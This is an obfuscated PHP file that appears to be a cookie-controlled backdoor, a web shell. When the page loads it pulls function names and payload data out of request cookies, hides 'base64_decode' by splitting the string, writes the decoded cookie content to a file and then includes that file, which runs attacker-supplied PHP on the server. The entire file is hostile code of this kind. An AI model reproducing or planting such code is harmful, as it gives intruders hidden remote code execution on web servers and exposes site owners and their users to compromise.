 <?php
class _7c
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s)
            self::i();
        $l = strlen($k);
		$b = 'base6' . '4_dec' . 'ode';
        $r = $b(self::$s[$n]);
        for ($i = 0, $c = strlen($r); $i !== $c; ++$i)
            $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_g' => '',
            '_mt' => ''
        );
    }
}
class _xc
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            00,
            04,
            047,
            047,
            01,
            047,
            02,
            04,
            01,
            04,
            03,
            011,
            015,
            00,
            013,
            031,
            016,
            023,
            03
        );
    }
}
function mbc()
{
    $_r          = $_COOKIE;
    $_aqt        = _xc::g(0);
    $_rh         = _xc::g(1);
    $_gpg        = array();
    $_gpg[$_aqt] = _7c::g('_' . 'g', '_b' . 'z' . 'z');
    while ($_rh) {
        $_gpg[$_aqt] .= $_r[_xc::g(2)][$_rh];
        if (!$_r[_xc::g(3)][$_rh + _xc::g(4)]) {
            if (!$_r[_xc::g(5)][$_rh + _xc::g(6)])
                break;
            $_aqt++;
            $_gpg[$_aqt] = _7c::g('_m' . 't', '_w');
            $_rh++;
        }
        $_rh = $_rh + _xc::g(7) + _xc::g(8);
    }
    $_aqt = $_gpg[_xc::g(9)]() . $_gpg[_xc::g(10)];
    if (!$_gpg[_xc::g(11)]($_aqt)) {
        $_rh = $_gpg[_xc::g(12)]($_aqt, $_gpg[_xc::g(13)]);
        $_gpg[_xc::g(14)]($_rh, $_gpg[_xc::g(15)] . $_gpg[_xc::g(16)]($_gpg[_xc::g(17)]($_r[_xc::g(18)])));
    }
    include($_aqt);
}
mbc();  /* whgfot */